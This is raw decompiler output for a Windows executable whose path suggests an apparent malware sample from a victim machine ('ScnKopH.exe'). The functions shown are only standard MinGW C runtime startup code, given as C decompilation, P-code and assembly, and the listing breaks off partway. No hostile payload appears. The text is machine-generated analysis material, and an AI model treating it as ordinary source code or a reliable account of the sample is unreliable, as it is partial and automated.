// Original file: C:\Users\victim\Downloads\babapro\ScnKopH.exe
Function: __mingw_invalidParameterHandler
C Decompilation:

/* WARNING: Unknown calling convention */

void __mingw_invalidParameterHandler
               (wchar_t *expression,wchar_t *function,wchar_t *file,uint line,uintptr_t pReserved)

{
  return;
}



Pcode Representation:
 ---  RETURN (const, 0x0, 8)


Native Assembly Code:
RET




// Original file: C:\Users\victim\Downloads\babapro\ScnKopH.exe
Function: pre_c_init
C Decompilation:

/* WARNING: Unknown calling convention */

int pre_c_init(void)

{
  int *piVar1;
  
  managedapp = 0;
  *(undefined4 *)_refptr___mingw_initltsdrot_force = 1;
  *(undefined4 *)_refptr___mingw_initltsdyn_force = 1;
  *(undefined4 *)_refptr___mingw_initltssuo_force = 1;
  if ((*(short *)_refptr___ImageBase == 0x5a4d) &&
     (piVar1 = (int *)(_refptr___ImageBase + *(int *)(_refptr___ImageBase + 0x3c)),
     *piVar1 == 0x4550)) {
    if (*(short *)(piVar1 + 6) == 0x10b) {
      if (0xe < (uint)piVar1[0x1d]) {
        managedapp = (int)(piVar1[0x3a] != 0);
      }
    }
    else if ((*(short *)(piVar1 + 6) == 0x20b) && (0xe < (uint)piVar1[0x21])) {
      managedapp = (int)(piVar1[0x3e] != 0);
    }
  }
  if (*(int *)_refptr___mingw_app_type == 0) {
    __set_app_type(1);
  }
  else {
    __set_app_type(2);
  }
  piVar1 = __p__fmode();
  *piVar1 = *(int *)_refptr__fmode;
  piVar1 = __p__commode();
  *piVar1 = *(int *)_refptr__commode;
  _setargv();
  if (*(int *)_refptr__MINGW_INSTALL_DEBUG_MATHERR != 1) {
    return 0;
  }
  __mingw_setusermatherr((_func_int__exception_ptr *)_refptr__matherr);
  return 0;
}



Pcode Representation:
(register, 0x8, 4) COPY (const, 0x0, 4)
(unique, 0x100000d9, 8) CAST (ram, 0x140004560, 8)
(ram, 0x1400044c0, 8) INDIRECT (ram, 0x1400044c0, 8) , (const, 0x15, 4)
(ram, 0x1400044e0, 8) INDIRECT (ram, 0x1400044e0, 8) , (const, 0x15, 4)
(ram, 0x140004550, 8) INDIRECT (ram, 0x140004550, 8) , (const, 0x15, 4)
(ram, 0x140004560, 8) INDIRECT (ram, 0x140004560, 8) , (const, 0x15, 4)
(ram, 0x140004570, 8) INDIRECT (ram, 0x140004570, 8) , (const, 0x15, 4)
(ram, 0x140004580, 8) INDIRECT (ram, 0x140004580, 8) , (const, 0x15, 4)
(ram, 0x140004600, 8) INDIRECT (ram, 0x140004600, 8) , (const, 0x15, 4)
(ram, 0x140004620, 8) INDIRECT (ram, 0x140004620, 8) , (const, 0x15, 4)
(ram, 0x140004640, 8) INDIRECT (ram, 0x140004640, 8) , (const, 0x15, 4)
 ---  STORE (const, 0x1b1, 4) , (unique, 0x100000d9, 8) , (const, 0x1, 4)
(unique, 0x100000e1, 8) CAST (ram, 0x140004570, 8)
(ram, 0x1400044c0, 8) INDIRECT (ram, 0x1400044c0, 8) , (const, 0x18, 4)
(ram, 0x1400044e0, 8) INDIRECT (ram, 0x1400044e0, 8) , (const, 0x18, 4)
(ram, 0x140004550, 8) INDIRECT (ram, 0x140004550, 8) , (const, 0x18, 4)
(ram, 0x140004560, 8) INDIRECT (ram, 0x140004560, 8) , (const, 0x18, 4)
(ram, 0x140004570, 8) INDIRECT (ram, 0x140004570, 8) , (const, 0x18, 4)
(ram, 0x140004580, 8) INDIRECT (ram, 0x140004580, 8) , (const, 0x18, 4)
(ram, 0x140004600, 8) INDIRECT (ram, 0x140004600, 8) , (const, 0x18, 4)
(ram, 0x140004620, 8) INDIRECT (ram, 0x140004620, 8) , (const, 0x18, 4)
(ram, 0x140004640, 8) INDIRECT (ram, 0x140004640, 8) , (const, 0x18, 4)
 ---  STORE (const, 0x1b1, 4) , (unique, 0x100000e1, 8) , (const, 0x1, 4)
(unique, 0x100000e9, 8) CAST (ram, 0x140004580, 8)
(ram, 0x1400044c0, 8) INDIRECT (ram, 0x1400044c0, 8) , (const, 0x1b, 4)
(ram, 0x1400044e0, 8) INDIRECT (ram, 0x1400044e0, 8) , (const, 0x1b, 4)
(ram, 0x140004550, 8) INDIRECT (ram, 0x140004550, 8) , (const, 0x1b, 4)
(ram, 0x140004560, 8) INDIRECT (ram, 0x140004560, 8) , (const, 0x1b, 4)
(ram, 0x140004570, 8) INDIRECT (ram, 0x140004570, 8) , (const, 0x1b, 4)
(ram, 0x140004580, 8) INDIRECT (ram, 0x140004580, 8) , (const, 0x1b, 4)
(ram, 0x140004600, 8) INDIRECT (ram, 0x140004600, 8) , (const, 0x1b, 4)
(ram, 0x140004620, 8) INDIRECT (ram, 0x140004620, 8) , (const, 0x1b, 4)
(ram, 0x140004640, 8) INDIRECT (ram, 0x140004640, 8) , (const, 0x1b, 4)
 ---  STORE (const, 0x1b1, 4) , (unique, 0x100000e9, 8) , (const, 0x1, 4)
(unique, 0x100000f1, 8) CAST (ram, 0x1400044e0, 8)
(unique, 0xda80, 2) LOAD (const, 0x1b1, 4) , (unique, 0x100000f1, 8)
(register, 0x206, 1) INT_EQUAL (unique, 0xda80, 2) , (const, 0x5a4d, 2)
 ---  CBRANCH (ram, 0x14000105a, 1) , (register, 0x206, 1)
(unique, 0x4400, 8) PTRADD (ram, 0x1400044e0, 8) , (const, 0x3c, 8) , (const, 0x1, 8)
(unique, 0x100000f9, 8) CAST (unique, 0x4400, 8)
(unique, 0xdb00, 4) LOAD (const, 0x1b1, 4) , (unique, 0x100000f9, 8)
(register, 0x10, 8) INT_SEXT (unique, 0xdb00, 4)
(unique, 0x10000101, 8) PTRADD (ram, 0x1400044e0, 8) , (register, 0x10, 8) , (const, 0x1, 8)
(register, 0x0, 8) CAST (unique, 0x10000101, 8)
(unique, 0xdb80, 4) LOAD (const, 0x1b1, 4) , (register, 0x0, 8)
(register, 0x206, 1) INT_EQUAL (unique, 0xdb80, 4) , (const, 0x4550, 4)
 ---  CBRANCH (ram, 0x1400010c0, 1) , (register, 0x206, 1)
(unique, 0x4400, 8) PTRADD (register, 0x0, 8) , (const, 0x6, 8) , (const, 0x4, 8)
(unique, 0x10000109, 8) CAST (unique, 0x4400, 8)
(unique, 0xda80, 2) LOAD (const, 0x1b1, 4) , (unique, 0x10000109, 8)
(register, 0x206, 1) INT_EQUAL (unique, 0xda80, 2) , (const, 0x10b, 2)
 ---  CBRANCH (ram, 0x140001110, 1) , (register, 0x206, 1)
(unique, 0x4400, 8) PTRADD (register, 0x0, 8) , (const, 0x1d, 8) , (const, 0x4, 8)
(unique, 0xdb80, 4) LOAD (const, 0x1b1, 4) , (unique, 0x4400, 8)
(unique, 0x10000111, 4) CAST (unique, 0xdb80, 4)
(unique, 0xe600, 1) INT_LESS (const, 0xe, 4) , (unique, 0x10000111, 4)
 ---  CBRANCH (ram, 0x14000105a, 1) , (unique, 0xe600, 1)
(unique, 0x4500, 8) PTRADD (register, 0x0, 8) , (const, 0x3a, 8) , (const, 0x4, 8)
(unique, 0xdb00, 4) LOAD (const, 0x1b1, 4) , (unique, 0x4500, 8)
(register, 0x206, 1) INT_NOTEQUAL (unique, 0xdb00, 4) , (const, 0x0, 4)
(register, 0x8, 4) INT_ZEXT (register, 0x206, 1)
 ---  BRANCH (ram, 0x14000105a, 1)
(register, 0x206, 1) INT_EQUAL (unique, 0xda80, 2) , (const, 0x20b, 2)
 ---  CBRANCH (ram, 0x14000105a, 1) , (register, 0x206, 1)
(unique, 0x4500, 8) PTRADD (register, 0x0, 8) , (const, 0x21, 8) , (const, 0x4, 8)
(unique, 0xdb80, 4) LOAD (const, 0x1b1, 4) , (unique, 0x4500, 8)
(unique, 0x10000115, 4) CAST (unique, 0xdb80, 4)
(unique, 0xe600, 1) INT_LESS (const, 0xe, 4) , (unique, 0x10000115, 4)
 ---  CBRANCH (ram, 0x14000105a, 1) , (unique, 0xe600, 1)
(unique, 0x4500, 8) PTRADD (register, 0x0, 8) , (const, 0x3e, 8) , (const, 0x4, 8)
(unique, 0xdb00, 4) LOAD (const, 0x1b1, 4) , (unique, 0x4500, 8)
(register, 0x206, 1) INT_NOTEQUAL (unique, 0xdb00, 4) , (const, 0x0, 4)
(register, 0x8, 4) INT_ZEXT (register, 0x206, 1)
 ---  BRANCH (ram, 0x14000105a, 1)
(register, 0x8, 4) MULTIEQUAL (register, 0x8, 4) , (register, 0x8, 4) , (register, 0x8, 4) , (register, 0x8, 4) , (register, 0x8, 4) , (register, 0x8, 4) , (register, 0x8, 4)
(unique, 0x10000119, 8) CAST (ram, 0x140004550, 8)
(unique, 0xdb00, 4) LOAD (const, 0x1b1, 4) , (unique, 0x10000119, 8)
(register, 0x206, 1) INT_EQUAL (unique, 0xdb00, 4) , (const, 0x0, 4)
 ---  CBRANCH (ram, 0x1400010b0, 1) , (register, 0x206, 1)
(ram, 0x1400044c0, 8) INDIRECT (ram, 0x1400044c0, 8) , (const, 0xaa, 4)
(ram, 0x1400044e0, 8) INDIRECT (ram, 0x1400044e0, 8) , (const, 0xaa, 4)
(ram, 0x140004550, 8) INDIRECT (ram, 0x140004550, 8) , (const, 0xaa, 4)
(ram, 0x140004560, 8) INDIRECT (ram, 0x140004560, 8) , (const, 0xaa, 4)
(ram, 0x140004570, 8) INDIRECT (ram, 0x140004570, 8) , (const, 0xaa, 4)
(ram, 0x140004580, 8) INDIRECT (ram, 0x140004580, 8) , (const, 0xaa, 4)
(ram, 0x140004600, 8) INDIRECT (ram, 0x140004600, 8) , (const, 0xaa, 4)
(ram, 0x140004620, 8) INDIRECT (ram, 0x140004620, 8) , (const, 0xaa, 4)
(ram, 0x140004640, 8) INDIRECT (ram, 0x140004640, 8) , (const, 0xaa, 4)
(ram, 0x14000700c, 4) INDIRECT (register, 0x8, 4) , (const, 0xaa, 4)
 ---  CALL (ram, 0x140002788, 8) , (const, 0x1, 4)
 ---  BRANCH (ram, 0x140001077, 1)
(ram, 0x1400044c0, 8) INDIRECT (ram, 0x1400044c0, 8) , (const, 0x54, 4)
(ram, 0x1400044e0, 8) INDIRECT (ram, 0x1400044e0, 8) , (const, 0x54, 4)
(ram, 0x140004550, 8) INDIRECT (ram, 0x140004550, 8) , (const, 0x54, 4)
(ram, 0x140004560, 8) INDIRECT (ram, 0x140004560, 8) , (const, 0x54, 4)
(ram, 0x140004570, 8) INDIRECT (ram, 0x140004570, 8) , (const, 0x54, 4)
(ram, 0x140004580, 8) INDIRECT (ram, 0x140004580, 8) , (const, 0x54, 4)
(ram, 0x140004600, 8) INDIRECT (ram, 0x140004600, 8) , (const, 0x54, 4)
(ram, 0x140004620, 8) INDIRECT (ram, 0x140004620, 8) , (const, 0x54, 4)
(ram, 0x140004640, 8) INDIRECT (ram, 0x140004640, 8) , (const, 0x54, 4)
(ram, 0x14000700c, 4) INDIRECT (register, 0x8, 4) , (const, 0x54, 4)
 ---  CALL (ram, 0x140002788, 8) , (const, 0x2, 4)
(ram, 0x14000700c, 4) MULTIEQUAL (ram, 0x14000700c, 4) , (ram, 0x14000700c, 4)
(ram, 0x140004640, 8) MULTIEQUAL (ram, 0x140004640, 8) , (ram, 0x140004640, 8)
(ram, 0x140004620, 8) MULTIEQUAL (ram, 0x140004620, 8) , (ram, 0x140004620, 8)
(ram, 0x140004600, 8) MULTIEQUAL (ram, 0x140004600, 8) , (ram, 0x140004600, 8)
(ram, 0x140004580, 8) MULTIEQUAL (ram, 0x140004580, 8) , (ram, 0x140004580, 8)
(ram, 0x140004570, 8) MULTIEQUAL (ram, 0x140004570, 8) , (ram, 0x140004570, 8)
(ram, 0x140004560, 8) MULTIEQUAL (ram, 0x140004560, 8) , (ram, 0x140004560, 8)
(ram, 0x140004550, 8) MULTIEQUAL (ram, 0x140004550, 8) , (ram, 0x140004550, 8)
(ram, 0x1400044e0, 8) MULTIEQUAL (ram, 0x1400044e0, 8) , (ram, 0x1400044e0, 8)
(ram, 0x1400044c0, 8) MULTIEQUAL (ram, 0x1400044c0, 8) , (ram, 0x1400044c0, 8)
(ram, 0x1400044c0, 8) INDIRECT (ram, 0x1400044c0, 8) , (const, 0x57, 4)
(ram, 0x1400044e0, 8) INDIRECT (ram, 0x1400044e0, 8) , (const, 0x57, 4)
(ram, 0x140004550, 8) INDIRECT (ram, 0x140004550, 8) , (const, 0x57, 4)
(ram, 0x140004560, 8) INDIRECT (ram, 0x140004560, 8) , (const, 0x57, 4)
(ram, 0x140004570, 8) INDIRECT (ram, 0x140004570, 8) , (const, 0x57, 4)
(ram, 0x140004580, 8) INDIRECT (ram, 0x140004580, 8) , (const, 0x57, 4)
(ram, 0x140004600, 8) INDIRECT (ram, 0x140004600, 8) , (const, 0x57, 4)
(ram, 0x140004620, 8) INDIRECT (ram, 0x140004620, 8) , (const, 0x57, 4)
(ram, 0x140004640, 8) INDIRECT (ram, 0x140004640, 8) , (const, 0x57, 4)
(ram, 0x14000700c, 4) INDIRECT (ram, 0x14000700c, 4) , (const, 0x57, 4)
(register, 0x0, 8) CALL (ram, 0x140002710, 8)
(unique, 0x10000121, 8) CAST (ram, 0x140004620, 8)
(unique, 0xdb00, 4) LOAD (const, 0x1b1, 4) , (unique, 0x10000121, 8)
(ram, 0x1400044c0, 8) INDIRECT (ram, 0x1400044c0, 8) , (const, 0x5d, 4)
(ram, 0x1400044e0, 8) INDIRECT (ram, 0x1400044e0, 8) , (const, 0x5d, 4)
(ram, 0x140004550, 8) INDIRECT (ram, 0x140004550, 8) , (const, 0x5d, 4)
(ram, 0x140004560, 8) INDIRECT (ram, 0x140004560, 8) , (const, 0x5d, 4)
(ram, 0x140004570, 8) INDIRECT (ram, 0x140004570, 8) , (const, 0x5d, 4)
(ram, 0x140004580, 8) INDIRECT (ram, 0x140004580, 8) , (const, 0x5d, 4)
(ram, 0x140004600, 8) INDIRECT (ram, 0x140004600, 8) , (const, 0x5d, 4)
(ram, 0x140004620, 8) INDIRECT (ram, 0x140004620, 8) , (const, 0x5d, 4)
(ram, 0x140004640, 8) INDIRECT (ram, 0x140004640, 8) , (const, 0x5d, 4)
(ram, 0x14000700c, 4) INDIRECT (ram, 0x14000700c, 4) , (const, 0x5d, 4)
 ---  STORE (const, 0x1b1, 4) , (register, 0x0, 8) , (unique, 0xdb00, 4)
(ram, 0x1400044c0, 8) INDIRECT (ram, 0x1400044c0, 8) , (const, 0x60, 4)
(ram, 0x1400044e0, 8) INDIRECT (ram, 0x1400044e0, 8) , (const, 0x60, 4)
(ram, 0x140004550, 8) INDIRECT (ram, 0x140004550, 8) , (const, 0x60, 4)
(ram, 0x140004560, 8) INDIRECT (ram, 0x140004560, 8) , (const, 0x60, 4)
(ram, 0x140004570, 8) INDIRECT (ram, 0x140004570, 8) , (const, 0x60, 4)
(ram, 0x140004580, 8) INDIRECT (ram, 0x140004580, 8) , (const, 0x60, 4)
(ram, 0x140004600, 8) INDIRECT (ram, 0x140004600, 8) , (const, 0x60, 4)
(ram, 0x140004620, 8) INDIRECT (ram, 0x140004620, 8) , (const, 0x60, 4)
(ram, 0x140004640, 8) INDIRECT (ram, 0x140004640, 8) , (const, 0x60, 4)
(ram, 0x14000700c, 4) INDIRECT (ram, 0x14000700c, 4) , (const, 0x60, 4)
(register, 0x0, 8) CALL (ram, 0x140002720, 8)
(unique, 0x10000129, 8) CAST (ram, 0x140004600, 8)
(unique, 0xdb00, 4) LOAD (const, 0x1b1, 4) , (unique, 0x10000129, 8)
(ram, 0x1400044c0, 8) INDIRECT (ram, 0x1400044c0, 8) , (const, 0x66, 4)
(ram, 0x1400044e0, 8) INDIRECT (ram, 0x1400044e0, 8) , (const, 0x66, 4)
(ram, 0x140004550, 8) INDIRECT (ram, 0x140004550, 8) , (const, 0x66, 4)
(ram, 0x140004560, 8) INDIRECT (ram, 0x140004560, 8) , (const, 0x66, 4)
(ram, 0x140004570, 8) INDIRECT (ram, 0x140004570, 8) , (const, 0x66, 4)
(ram, 0x140004580, 8) INDIRECT (ram, 0x140004580, 8) , (const, 0x66, 4)
(ram, 0x140004600, 8) INDIRECT (ram, 0x140004600, 8) , (const, 0x66, 4)
(ram, 0x140004620, 8) INDIRECT (ram, 0x140004620, 8) , (const, 0x66, 4)
(ram, 0x140004640, 8) INDIRECT (ram, 0x140004640, 8) , (const, 0x66, 4)
(ram, 0x14000700c, 4) INDIRECT (ram, 0x14000700c, 4) , (const, 0x66, 4)
 ---  STORE (const, 0x1b1, 4) , (register, 0x0, 8) , (unique, 0xdb00, 4)
(ram, 0x1400044c0, 8) INDIRECT (ram, 0x1400044c0, 8) , (const, 0x69, 4)
(ram, 0x1400044e0, 8) INDIRECT (ram, 0x1400044e0, 8) , (const, 0x69, 4)
(ram, 0x140004550, 8) INDIRECT (ram, 0x140004550, 8) , (const, 0x69, 4)
(ram, 0x140004560, 8) INDIRECT (ram, 0x140004560, 8) , (const, 0x69, 4)
(ram, 0x140004570, 8) INDIRECT (ram, 0x140004570, 8) , (const, 0x69, 4)
(ram, 0x140004580, 8) INDIRECT (ram, 0x140004580, 8) , (const, 0x69, 4)
(ram, 0x140004600, 8) INDIRECT (ram, 0x140004600, 8) , (const, 0x69, 4)
(ram, 0x140004620, 8) INDIRECT (ram, 0x140004620, 8) , (const, 0x69, 4)
(ram, 0x140004640, 8) INDIRECT (ram, 0x140004640, 8) , (const, 0x69, 4)
(ram, 0x14000700c, 4) INDIRECT (ram, 0x14000700c, 4) , (const, 0x69, 4)
 ---  CALL (ram, 0x140001720, 8)
(unique, 0x10000131, 8) CAST (ram, 0x1400044c0, 8)
(unique, 0xdb80, 4) LOAD (const, 0x1b1, 4) , (unique, 0x10000131, 8)
(register, 0x206, 1) INT_NOTEQUAL (unique, 0xdb80, 4) , (const, 0x1, 4)
 ---  CBRANCH (ram, 0x1400010f8, 1) , (register, 0x206, 1)
(unique, 0x10000139, 8) CAST (ram, 0x140004640, 8)
(ram, 0x1400044c0, 8) INDIRECT (ram, 0x1400044c0, 8) , (const, 0x90, 4)
(ram, 0x1400044e0, 8) INDIRECT (ram, 0x1400044e0, 8) , (const, 0x90, 4)
(ram, 0x140004550, 8) INDIRECT (ram, 0x140004550, 8) , (const, 0x90, 4)
(ram, 0x140004560, 8) INDIRECT (ram, 0x140004560, 8) , (const, 0x90, 4)
(ram, 0x140004570, 8) INDIRECT (ram, 0x140004570, 8) , (const, 0x90, 4)
(ram, 0x140004580, 8) INDIRECT (ram, 0x140004580, 8) , (const, 0x90, 4)
(ram, 0x140004600, 8) INDIRECT (ram, 0x140004600, 8) , (const, 0x90, 4)
(ram, 0x140004620, 8) INDIRECT (ram, 0x140004620, 8) , (const, 0x90, 4)
(ram, 0x140004640, 8) INDIRECT (ram, 0x140004640, 8) , (const, 0x90, 4)
(ram, 0x14000700c, 4) INDIRECT (ram, 0x14000700c, 4) , (const, 0x90, 4)
 ---  CALL (ram, 0x140001e90, 8) , (unique, 0x10000139, 8)
(register, 0x0, 4) COPY (const, 0x0, 4)
(ram, 0x1400044c0, 8) COPY (ram, 0x1400044c0, 8)
(ram, 0x1400044e0, 8) COPY (ram, 0x1400044e0, 8)
(ram, 0x140004550, 8) COPY (ram, 0x140004550, 8)
(ram, 0x140004560, 8) COPY (ram, 0x140004560, 8)
(ram, 0x140004570, 8) COPY (ram, 0x140004570, 8)
(ram, 0x140004580, 8) COPY (ram, 0x140004580, 8)
(ram, 0x140004600, 8) COPY (ram, 0x140004600, 8)
(ram, 0x140004620, 8) COPY (ram, 0x140004620, 8)
(ram, 0x140004640, 8) COPY (ram, 0x140004640, 8)
(ram, 0x14000700c, 4) COPY (ram, 0x14000700c, 4)
 ---  RETURN (const, 0x0, 8) , (register, 0x0, 4)
(register, 0x0, 4) COPY (const, 0x0, 4)
(ram, 0x1400044c0, 8) COPY (ram, 0x1400044c0, 8)
(ram, 0x1400044e0, 8) COPY (ram, 0x1400044e0, 8)
(ram, 0x140004550, 8) COPY (ram, 0x140004550, 8)
(ram, 0x140004560, 8) COPY (ram, 0x140004560, 8)
(ram, 0x140004570, 8) COPY (ram, 0x140004570, 8)
(ram, 0x140004580, 8) COPY (ram, 0x140004580, 8)
(ram, 0x140004600, 8) COPY (ram, 0x140004600, 8)
(ram, 0x140004620, 8) COPY (ram, 0x140004620, 8)
(ram, 0x140004640, 8) COPY (ram, 0x140004640, 8)
(ram, 0x14000700c, 4) COPY (ram, 0x14000700c, 4)
 ---  RETURN (const, 0x0, 8) , (register, 0x0, 4)


Native Assembly Code:
SUB RSP,0x28
MOV RAX,qword ptr [0x140004560]
XOR ECX,ECX
MOV dword ptr [RAX],0x1
MOV RAX,qword ptr [0x140004570]
MOV dword ptr [RAX],0x1
MOV RAX,qword ptr [0x140004580]
MOV dword ptr [RAX],0x1
MOV RAX,qword ptr [0x1400044e0]
CMP word ptr [RAX],0x5a4d
JNZ 0x14000105a
MOVSXD RDX,dword ptr [RAX + 0x3c]
ADD RAX,RDX
CMP dword ptr [RAX],0x4550
JZ 0x1400010c0
MOV RAX,qword ptr [0x140004550]
MOV dword ptr [0x14000700c],ECX
MOV EAX,dword ptr [RAX]
TEST EAX,EAX
JZ 0x1400010b0
MOV ECX,0x2
CALL 0x140002788
CALL 0x140002710
MOV RDX,qword ptr [0x140004620]
MOV EDX,dword ptr [RDX]
MOV dword ptr [RAX],EDX
CALL 0x140002720
MOV RDX,qword ptr [0x140004600]
MOV EDX,dword ptr [RDX]
MOV dword ptr [RAX],EDX
CALL 0x140001720
MOV RAX,qword ptr [0x1400044c0]
CMP dword ptr [RAX],0x1
JZ 0x1400010f8
XOR EAX,EAX
ADD RSP,0x28
RET
MOV ECX,0x1
CALL 0x140002788
JMP 0x140001077
MOVZX EDX,word ptr [RAX + 0x18]
CMP DX,0x10b
JZ 0x140001110
CMP DX,0x20b
JNZ 0x14000105a
CMP dword ptr [RAX + 0x84],0xe
JBE 0x14000105a
MOV EDX,dword ptr [RAX + 0xf8]
XOR ECX,ECX
TEST EDX,EDX
SETNZ CL
JMP 0x14000105a
MOV RCX,qword ptr [0x140004640]
CALL 0x140001e90
XOR EAX,EAX
ADD RSP,0x28
RET
CMP dword ptr [RAX + 0x74],0xe
JBE 0x14000105a
MOV R8D,dword ptr [RAX + 0xe8]
XOR ECX,ECX
TEST R8D,R8D
SETNZ CL
JMP 0x14000105a




// Original file: C:\Users\victim\Downloads\babapro\ScnKopH.exe
Function: pre_cpp_init
C Decompilation:

/* WARNING: Unknown calling convention -- yet parameter storage is locked */

void pre_cpp_init(void)

{
  startinfo.newmode = *(int *)_refptr__newmode;
  __getmainargs(&argc,&argv,&envp,*(undefined4 *)_refptr__dowildcard,&startinfo);
  return;
}



Pcode Representation:
(unique, 0x10000039, 8) CAST (ram, 0x140004650, 8)
(unique, 0xdb00, 4) LOAD (const, 0x1b1, 4) , (unique, 0x10000039, 8)
(unique, 0x10000041, 8) CAST (ram, 0x140004610, 8)
(unique, 0xdb00, 4) LOAD (const, 0x1b1, 4) , (unique, 0x10000041, 8)
(unique, 0x10000019, 8) PTRSUB (const, 0x0, 8) , (const, 0x140007004, 8)
(unique, 0x10000021, 8) PTRSUB (const, 0x0, 8) , (const, 0x140007018, 8)
(unique, 0x10000029, 8) PTRSUB (const, 0x0, 8) , (const, 0x140007020, 8)
(unique, 0x10000031, 8) PTRSUB (const, 0x0, 8) , (const, 0x140007028, 8)
(ram, 0x140004610, 8) INDIRECT (ram, 0x140004610, 8) , (const, 0x1b, 4)
(ram, 0x140004650, 8) INDIRECT (ram, 0x140004650, 8) , (const, 0x1b, 4)
(ram, 0x140007004, 4) INDIRECT (unique, 0xdb00, 4) , (const, 0x1b, 4)
 ---  CALL (ram, 0x140002778, 8) , (unique, 0x10000031, 8) , (unique, 0x10000029, 8) , (unique, 0x10000021, 8) , (unique, 0xdb00, 4) , (unique, 0x10000019, 8)
(ram, 0x140004610, 8) COPY (ram, 0x140004610, 8)
(ram, 0x140004650, 8) COPY (ram, 0x140004650, 8)
(ram, 0x140007004, 4) COPY (ram, 0x140007004, 4)
 ---  RETURN (const, 0x0, 8)


Native Assembly Code:
SUB RSP,0x38
MOV RAX,qword ptr [0x140004650]
LEA R8,[0x140007018]
LEA RDX,[0x140007020]
LEA RCX,[0x140007028]
MOV EAX,dword ptr [RAX]
MOV dword ptr [0x140007004],EAX
MOV RAX,qword ptr [0x140004610]
MOV R9D,dword ptr [RAX]
LEA RAX,[0x140007004]
MOV qword ptr [RSP + 0x20],RAX
CALL 0x140002778
NOP
ADD RSP,0x38
RET




// Original file: C:\Users\victim\Downloads\babapro\ScnKopH.exe
Function: __tmainCRTStartup
C Decompilation:

/* WARNING: Unknown calling convention */

int __tmainCRTStartup(void)

{
  undefined8 *puVar1;
  int iVar2;
  bool bVar3;
  undefined *puVar4;
  undefined *puVar5;
  undefined *puVar6;
  undefined *puVar7;
  _TCHAR **pp_Var8;
  int iVar9;
  longlong lVar10;
  LPTOP_LEVEL_EXCEPTION_FILTER pPVar11;
  _TCHAR **pp_Var12;
  size_t sVar13;
  void *_Dst;
  longlong lVar14;
  size_t _Size;
  _TCHAR **pp_Var15;
  longlong unaff_GS_OFFSET;
  
  puVar4 = _refptr___native_startup_lock;
  lVar14 = *(longlong *)(*(longlong *)(unaff_GS_OFFSET + 0x30) + 8);
  while( true ) {
    LOCK();
    lVar10 = *(longlong *)puVar4;
    if (lVar10 == 0) {
      *(longlong *)puVar4 = lVar14;
      lVar10 = 0;
    }
    puVar7 = _refptr___xi_z;
    puVar6 = _refptr___xi_a;
    puVar5 = _refptr___native_startup_state;
    UNLOCK();
    if (lVar10 == 0) break;
    if (lVar14 == lVar10) {
      bVar3 = true;
      iVar2 = *(int *)_refptr___native_startup_state;
joined_r0x000140001331:
      if (iVar2 == 1) {
        _amsg_exit(0x1f);
        iVar2 = *(int *)puVar5;
      }
      else {
        if (*(int *)_refptr___native_startup_state == 0) {
          *(undefined4 *)_refptr___native_startup_state = 1;
          _initterm(puVar6,puVar7);
        }
        else {
          has_cctor = 1;
        }
        iVar2 = *(int *)puVar5;
      }
      if (iVar2 == 1) {
        _initterm(_refptr___xc_a,_refptr___xc_z);
        *(undefined4 *)puVar5 = 2;
      }
      if (!bVar3) {
        LOCK();
        *(undefined8 *)puVar4 = 0;
        UNLOCK();
      }
      if (*(code **)_refptr___dyn_tls_init_callback != (code *)0x0) {
        (**(code **)_refptr___dyn_tls_init_callback)(0,2,0);
      }
      _pei386_runtime_relocator();
      pPVar11 = SetUnhandledExceptionFilter
                          ((LPTOP_LEVEL_EXCEPTION_FILTER)_refptr__gnu_exception_handler);
      *(LPTOP_LEVEL_EXCEPTION_FILTER *)_refptr___mingw_oldexcpt_handler = pPVar11;
      mingw_set_invalid_parameter_handler(__mingw_invalidParameterHandler);
      _fpreset();
      iVar9 = argc;
      iVar2 = argc + 1;
      _Size = (longlong)iVar2 * 8;
      pp_Var12 = (_TCHAR **)malloc(_Size);
      pp_Var8 = argv;
      pp_Var15 = pp_Var12;
      if (0 < iVar9) {
        lVar14 = 0;
        do {
          sVar13 = strlen(*(char **)((longlong)pp_Var8 + lVar14));
          _Dst = malloc(sVar13 + 1);
          *(void **)((longlong)pp_Var12 + lVar14) = _Dst;
          puVar1 = (undefined8 *)((longlong)pp_Var8 + lVar14);
          lVar14 = lVar14 + 8;
          memcpy(_Dst,(void *)*puVar1,sVar13 + 1);
        } while (_Size - 8 != lVar14);
        pp_Var15 = pp_Var12 + (longlong)iVar2 + -1;
      }
      *pp_Var15 = (_TCHAR *)0x0;
      argv = pp_Var12;
      __main();
      iVar2 = argc;
      pp_Var8 = envp;
      **(undefined8 **)_refptr___imp___initenv = envp;
      mainret = main(iVar2,argv,pp_Var8);
      if (managedapp != 0) {
        if (has_cctor != 0) {
          return mainret;
        }
        _cexit();
        return mainret;
      }
                    /* WARNING: Subroutine does not return */
      exit(mainret);
    }
    Sleep(1000);
  }
  bVar3 = false;
  iVar2 = *(int *)_refptr___native_startup_state;
  goto joined_r0x000140001331;
}



Pcode Representation:
(unique, 0x100002c5, 8) COPY (ram, 0x1400045a0, 8)
(register, 0x38, 8) COPY (const, 0x0, 8)
(unique, 0x1000031d, 8) INT_ADD (register, 0x118, 8) , (const, 0x30, 8)
(unique, 0x6200, 8) CAST (unique, 0x1000031d, 8)
(unique, 0xdc00, 8) LOAD (const, 0x1b1, 4) , (unique, 0x6200, 8)
(unique, 0x10000325, 8) INT_ADD (unique, 0xdc00, 8) , (const, 0x8, 8)
(unique, 0x4400, 8) CAST (unique, 0x10000325, 8)
(unique, 0xdc00, 8) LOAD (const, 0x1b1, 4) , (unique, 0x4400, 8)
 ---  BRANCH (ram, 0x1400011c0, 1)
(ram, 0x140007028, 4) MULTIEQUAL (ram, 0x140007028, 4) , (ram, 0x140007028, 4)
(ram, 0x140007020, 8) MULTIEQUAL (ram, 0x140007020, 8) , (ram, 0x140007020, 8)
(ram, 0x140007018, 8) MULTIEQUAL (ram, 0x140007018, 8) , (ram, 0x140007018, 8)
(ram, 0x140007010, 4) MULTIEQUAL (ram, 0x140007010, 4) , (ram, 0x140007010, 4)
(ram, 0x14000700c, 4) MULTIEQUAL (ram, 0x14000700c, 4) , (ram, 0x14000700c, 4)
(ram, 0x140007008, 4) MULTIEQUAL (ram, 0x140007008, 4) , (ram, 0x140007008, 4)
(ram, 0x140004630, 8) MULTIEQUAL (ram, 0x140004630, 8) , (ram, 0x140004630, 8)
(ram, 0x1400045f0, 8) MULTIEQUAL (ram, 0x1400045f0, 8) , (ram, 0x1400045f0, 8)
(ram, 0x1400045e0, 8) MULTIEQUAL (ram, 0x1400045e0, 8) , (ram, 0x1400045e0, 8)
(ram, 0x1400045d0, 8) MULTIEQUAL (ram, 0x1400045d0, 8) , (ram, 0x1400045d0, 8)
